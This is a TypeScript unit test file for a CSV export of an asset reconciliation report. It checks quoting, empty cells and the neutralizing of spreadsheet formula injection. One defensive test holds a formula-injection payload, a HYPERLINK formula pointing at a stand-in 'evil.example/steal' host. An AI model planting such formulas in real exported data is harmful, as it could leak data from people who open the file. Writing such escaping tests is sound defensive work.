import { describe, expect, it } from "vitest";
import { reportToCsv } from "@/lib/csv";
import type { ReconcileReport } from "@/lib/reconcile";

const report: ReconcileReport = {
  generated_at: "2026-05-14T00:00:00.000Z",
  totals: {
    assets: 2,
    facilities_records: 0,
    finance_records: 0,
    issues_needs_action: 1,
    issues_watch: 1,
    issues_info: 0,
  },
  issues: [
    {
      severity: "needs_action",
      category: "rack_mismatch",
      asset_tag: "C0000110",
      headline: "Rack location disagrees",
      detail: "Ops and facilities point at different racks.",
      comparison: {
        label: "rack location",
        ops: "B/C-12/U18",
        facilities: "B/C-12/U16",
      },
    },
    {
      severity: "watch",
      category: "stale_facilities_observation",
      asset_tag: "C0000111",
      headline: "Facilities observation is stale",
      detail: 'Last seen "ages" ago, with a comma',
    },
  ],
};

describe("reportToCsv", () => {
  it("emits the header row", () => {
    const csv = reportToCsv(report);
    expect(csv.split("\r\n")[0]).toBe(
      "severity,category,asset_tag,headline,detail,ops_value,facilities_value,finance_value",
    );
  });

  it("emits one row per issue", () => {
    const csv = reportToCsv(report);
    expect(csv.trimEnd().split("\r\n")).toHaveLength(3); // header + 2 issues
  });

  it("quotes fields with embedded commas or quotes", () => {
    const csv = reportToCsv(report);
    expect(csv).toContain('"Last seen ""ages"" ago, with a comma"');
  });

  it("handles missing comparison fields", () => {
    const csv = reportToCsv(report);
    // Second issue has no comparison.facilities or finance — should emit empty cells.
    const lastRow = csv.trimEnd().split("\r\n").pop()!;
    expect(lastRow.endsWith(",,,")).toBe(true);
  });

  it("neutralizes formula-injection payloads in upstream-sourced fields", () => {
    const injected: ReconcileReport = {
      ...report,
      issues: [
        {
          severity: "watch",
          category: "site_mismatch",
          asset_tag: "C0000101",
          headline: "Building disagreement with finance",
          detail: "test",
          comparison: {
            label: "site",
            ops: "lab-a",
            finance: '=HYPERLINK("http://evil.example/steal","Open")',
          },
        },
      ],
    };
    const csv = reportToCsv(injected);
    const lastRow = csv.trimEnd().split("\r\n").pop()!;
    // The formula must not appear at the start of a cell unescaped — it should
    // be prefixed with a leading single quote so spreadsheet software treats
    // it as literal text instead of executing it.
    expect(lastRow).toContain('"\'=HYPERLINK(""http://evil.example/steal"",""Open"")"');
    expect(lastRow).not.toContain('"=HYPERLINK(');
  });

  it("neutralizes +, -, and @ leading characters too", () => {
    for (const payload of ["+1+1", "-2+3", "@SUM(A1:A9)"]) {
      const injected: ReconcileReport = {
        ...report,
        issues: [
          {
            severity: "info" as const,
            category: "site_mismatch",
            asset_tag: "C0000102",
            headline: "test",
            detail: payload,
          },
        ],
      };
      const csv = reportToCsv(injected);
      // The raw payload should never appear at the start of its cell — it
      // must be prefixed with a leading single quote wherever it lands.
      expect(csv).toContain(`'${payload}`);
      expect(csv).not.toMatch(new RegExp(`,${payload.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}`));
    }
  });
});
